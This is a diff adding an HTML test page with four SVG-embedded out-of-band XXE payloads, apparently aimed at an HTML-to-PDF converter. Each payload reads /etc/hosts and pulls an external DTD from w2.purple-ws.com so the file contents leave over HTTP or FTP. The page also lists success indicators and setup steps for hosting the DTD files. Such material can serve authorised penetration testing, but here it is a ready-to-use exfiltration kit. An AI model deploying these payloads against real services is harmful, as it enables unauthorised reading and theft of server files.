@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>XXE Out-of-Band Test - /etc/hosts</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: white;
+            padding: 20px;
+            margin: 0;
+        }
+        h1 { 
+            color: #c00; 
+            font-size: 28px;
+            border-bottom: 3px solid #c00;
+            padding-bottom: 10px;
+        }
+        .test-box {
+            border: 3px solid #c00;
+            padding: 20px;
+            margin: 20px 0;
+            background: #fff8f8;
+        }
+        .info {
+            background: #ffc;
+            border: 2px solid #cc0;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .warning {
+            background: #fff0f0;
+            border: 2px solid #c00;
+            padding: 15px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>🔴 XXE Out-of-Band Test - Data Exfiltration</h1>
+    
+    <div class="info">
+        <p style="margin: 0; font-size: 14px;">
+            <strong>Target File:</strong> /etc/hosts<br>
+            <strong>Method:</strong> Out-of-Band XXE with Parameter Entities<br>
+            <strong>Expected:</strong> File contents sent to attacker server via HTTP callback
+        </p>
+    </div>
+
+    <div class="warning">
+        <h3 style="color: #c00; margin-top: 0;">⚠️ IMPORTANT</h3>
+        <p style="font-size: 14px;">
+            <strong>Before testing, replace ALL instances of:</strong><br>
+            <code style="background: #f0f0f0; padding: 5px;">w2.purple-ws.com</code><br>
+            with your actual server domain (ngrok, burp collaborator, etc.)
+        </p>
+    </div>
+
+    <div class="test-box">
+        <h2 style="margin-top: 0;">Test 1: Classic OOB XXE with Parameter Entity</h2>
+        <p>File contents will be sent to your server, not visible in PDF</p>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" 
+             version="1.1" 
+             width="700" 
+             height="300" 
+             style="border: 2px solid #999;">
+            
+            <!DOCTYPE svg [
+                <!ENTITY % file SYSTEM "file:///etc/hosts">
+                <!ENTITY % dtd SYSTEM "http://w2.purple-ws.com/xxe-oob.dtd">
+                %dtd;
+                %send;
+            ]>
+            
+            <rect width="700" height="300" fill="#f9f9f9"/>
+            
+            <text x="10" y="30" font-size="16" font-weight="bold" fill="#c00">
+                🔓 OOB XXE Test #1
+            </text>
+            
+            <text x="10" y="60" font-size="12" fill="#666">
+                Status: XXE payload executed
+            </text>
+            
+            <text x="10" y="85" font-size="12" fill="#666">
+                Check your server logs for HTTP callback with /etc/hosts content
+            </text>
+            
+            <text x="10" y="110" font-size="11" fill="#999">
+                Expected callback URL: http://w2.purple-ws.com/xxe-callback?data=[file_content]
+            </text>
+            
+            <text x="10" y="150" font-size="10" font-family="monospace" fill="#333">
+                This test attempts to:
+            </text>
+            <text x="10" y="170" font-size="10" font-family="monospace" fill="#333">
+                1. Read /etc/hosts into %file entity
+            </text>
+            <text x="10" y="190" font-size="10" font-family="monospace" fill="#333">
+                2. Load external DTD from your server
+            </text>
+            <text x="10" y="210" font-size="10" font-family="monospace" fill="#333">
+                3. DTD defines %send entity that makes HTTP request
+            </text>
+            <text x="10" y="230" font-size="10" font-family="monospace" fill="#333">
+                4. File content sent as URL parameter to your server
+            </text>
+        </svg>
+    </div>
+
+    <div class="test-box">
+        <h2 style="margin-top: 0;">Test 2: Alternative OOB with FTP Protocol</h2>
+        <p>Using FTP for out-of-band data channel:</p>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" 
+             version="1.1" 
+             width="700" 
+             height="300" 
+             style="border: 2px solid #999;">
+            
+            <!DOCTYPE svg [
+                <!ENTITY % file SYSTEM "file:///etc/hosts">
+                <!ENTITY % dtd SYSTEM "http://w2.purple-ws.com/xxe-ftp.dtd">
+                %dtd;
+                %send;
+            ]>
+            
+            <rect width="700" height="300" fill="#f0f8ff"/>
+            
+            <text x="10" y="30" font-size="16" font-weight="bold" fill="#c00">
+                🔓 OOB XXE Test #2 (FTP)
+            </text>
+            
+            <text x="10" y="60" font-size="12" fill="#666">
+                Alternative exfiltration via FTP protocol
+            </text>
+            
+            <text x="10" y="85" font-size="11" fill="#999">
+                Expected: FTP connection to your server with file in path
+            </text>
+        </svg>
+    </div>
+
+    <div class="test-box">
+        <h2 style="margin-top: 0;">Test 3: Blind OOB XXE (No Direct Output)</h2>
+        <p>Purely out-of-band - confirms vulnerability even if content not in PDF:</p>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" 
+             version="1.1" 
+             width="700" 
+             height="300" 
+             style="border: 2px solid #999;">
+            
+            <!DOCTYPE svg [
+                <!ENTITY % file SYSTEM "file:///etc/hosts">
+                <!ENTITY % dtd SYSTEM "http://w2.purple-ws.com/xxe-blind.dtd">
+                %dtd;
+                %exfil;
+            ]>
+            
+            <rect width="700" height="300" fill="#fffaf0"/>
+            
+            <text x="10" y="30" font-size="16" font-weight="bold" fill="#c00">
+                🔓 Blind OOB XXE Test
+            </text>
+            
+            <text x="10" y="60" font-size="12" fill="#666">
+                No visible output - check server logs only
+            </text>
+            
+            <text x="10" y="85" font-size="11" fill="#999">
+                This is useful when in-band XXE is filtered
+            </text>
+        </svg>
+    </div>
+
+    <div class="test-box">
+        <h2 style="margin-top: 0;">Test 4: Chunked OOB XXE (For Large Files)</h2>
+        <p>Handles larger files by sending in chunks:</p>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" 
+             version="1.1" 
+             width="700" 
+             height="300" 
+             style="border: 2px solid #999;">
+            
+            <!DOCTYPE svg [
+                <!ENTITY % start "<![CDATA[">
+                <!ENTITY % file SYSTEM "file:///etc/hosts">
+                <!ENTITY % end "]]>">
+                <!ENTITY % dtd SYSTEM "http://w2.purple-ws.com/xxe-chunked.dtd">
+                %dtd;
+                %send;
+            ]>
+            
+            <rect width="700" height="300" fill="#fff0f0"/>
+            
+            <text x="10" y="30" font-size="16" font-weight="bold" fill="#c00">
+                🔓 Chunked OOB XXE
+            </text>
+            
+            <text x="10" y="60" font-size="12" fill="#666">
+                Uses CDATA to handle special characters in file content
+            </text>
+        </svg>
+    </div>
+
+    <div style="background: #f0fff0; border: 2px solid #0a0; padding: 15px; margin: 20px 0;">
+        <h3 style="color: #0a0; margin-top: 0;">✅ Success Indicators</h3>
+        <ul style="line-height: 2;">
+            <li><strong>HTTP request to your server</strong> with /etc/hosts content in URL parameter</li>
+            <li><strong>FTP connection attempt</strong> (check FTP logs if running FTP server)</li>
+            <li><strong>DNS query</strong> to your domain (indicates DTD fetch attempted)</li>
+            <li><strong>PDF may appear empty</strong> - that's normal for OOB XXE</li>
+        </ul>
+    </div>
+
+    <div style="background: #fff0f0; border: 2px solid #c00; padding: 15px; margin: 20px 0;">
+        <h3 style="color: #c00; margin-top: 0;">⚠️ Setup Required</h3>
+        <p style="font-size: 14px; margin-bottom: 10px;">
+            <strong>You MUST host these DTD files on your server:</strong>
+        </p>
+        <ul style="line-height: 2;">
+            <li><code>xxe-oob.dtd</code> - Basic OOB exfiltration</li>
+            <li><code>xxe-ftp.dtd</code> - FTP-based exfiltration</li>
+            <li><code>xxe-blind.dtd</code> - Blind XXE confirmation</li>
+            <li><code>xxe-chunked.dtd</code> - Chunked data handling</li>
+        </ul>
+        <p style="font-size: 14px; margin-top: 10px;">
+            See below for DTD file contents and server setup instructions.
+        </p>
+    </div>
+
+</body>
+</html>
